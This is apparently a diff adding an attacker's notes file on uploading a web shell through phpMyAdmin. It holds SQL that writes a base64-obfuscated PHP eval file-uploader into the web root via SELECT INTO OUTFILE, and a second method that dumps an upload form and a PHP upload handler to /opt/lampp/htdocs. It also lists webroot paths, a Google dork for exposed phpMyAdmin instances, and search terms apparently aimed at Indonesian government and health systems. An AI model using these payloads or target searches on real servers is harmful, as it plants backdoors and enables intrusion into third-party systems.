@@ -1,0 +1,128 @@
+https://pastebin.com/AWxRGmcj
+https://www.fahmi.my.id/trik-tanam-shell-lewat-phpmyadmin.html
+
+use mysql;
+DROP TABLE IF EXISTS temptab;
+CREATE TABLE temptab (codetab text);
+INSERT INTO temptab (codetab) values ('<?=eval("?>".base64_decode("PD9waHAgZWNobyAnPHByZT4nLnBocF91bmFtZSgpLiJcbiIuJzxici8+PGZvcm0gbWV0aG9kPSJwb3N0IiBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIj48aW5wdXQgdHlwZT0iZmlsZSIgbmFtZT0iX18iPjxpbnB1dCBuYW1lPSJfIiB0eXBlPSJzdWJtaXQiIHZhbHVlPSJVcGxvYWQiPjwvZm9ybT4nO2lmKCRfUE9TVCl7aWYoQGNvcHkoJF9GSUxFU1snX18nXVsndG1wX25hbWUnXSwgJF9GSUxFU1snX18nXVsnbmFtZSddKSl7ZWNobyAnT0snO31lbHNle2VjaG8gJ0VSJzt9fT8+"));?>');
+SELECT * INTO OUTFILE 'C:/xampp/htdocs/xnxx12.php' from temptab;
+DROP TABLE temptab;
+FLUSH LOGS;
+
+C:/xampp/phpmyadmin/doc
+/phpmyadmin/server_sql.php
+C:\ProgramData\MySQL\MySQL Server 5.1\Data\
+
+
+windows
+C:/xampp/htdocs/ C:/laragon/wwww/ C:/wamp/www/ 
+
+linux 
+/var/www/html
+
+/phpmyadmin/server_sql.php
+
+
+
+
+
+dashboard
+SCRIPT_FILENAME
+
+
+sinamedika
+simadu Sistem Informasi & Manajemen terpaDU
+Set-Cookie: phpMyAdmin=
+disdukcapil
+http.component:"jquery"
+
+__________________________________________________________________________________________________________________________________________________________________________________________________________________
+
+Upload shell via Phpmyadmin by Lionhack - from Hackerschool fr and Altui.
+
+
+
+Dorks : allinurl:index.php?db=information_schema
+
+
+
+CREATE TABLE `DB NAME`.`userform` (
+`track1` VARCHAR( 1000 ) NOT NULL
+) ENGINE = MYISAM ;
+
+
+
+
+
+
+
+...........................................................
+CREATE TABLE `DB NAME`.`user_upload` (
+`track2` VARCHAR( 1000 ) NOT NULL
+) ENGINE = MYISAM ;
+............................................................
+
+
+
+
+
+insert into userform values ('<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" 
+
+"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>HackerSchool Fr - Altui</title>
+</head>
+<body bgcolor="white">
+<div style=" color:#F00;text-align:center; margin-top:60px; font-size:25px;
+">&gt;&gt;  &nbsp; *HackerSchool Fr - Altui* Upload Your file </div>
+<div style="padding-top:75px;margin-left:450px;width:340px; height:70px;"> 
+<form enctype="multipart/form-data" action="upload.php" method="post">
+<input name="userfile" type="file" />&nbsp;
+<input type="submit" value="Upload" />
+</form>
+</div>
+</body>
+</html>');
+
+
+......................................................................
+
+select * into dumpfile '/opt/lampp/htdocs/filename.php' from userform
+.......................................................................
+
+
+
+
+
+
+
+
+
+
+
+
+INSERT INTO user_upload
+VALUES (
+"<?php $uploaddir = '/opt/lampp/htdocs/'; $uploadfile = $uploaddir . basename($_FILES['userfile']['name']); if 
+
+(move_uploaded_file($_FILES['userfile']['tmp_name'],$uploadfile)) { print '<body bgcolor=#000></br></br><div 
+
+align=center><font size=5 color=#ff0000>HackerSchool fr- Altui | uploaded successfully</font></body>'; } else { print '<body 
+
+bgcolor=#000></br></br><div align=center><font size=5 color=#ff0000>HackerSchool fr- Altui| Error !
+</font> <marquee> Lionhack </marquee> </body>'; } ?> "
+)
+
+
+
+
+........................................................................
+select * into dumpfile '/opt/lampp/htdocs/upload.php' from user_upload
+........................................................................
+
+
+
+
+NB: /opt/lampp/htdocs/ ... is the website
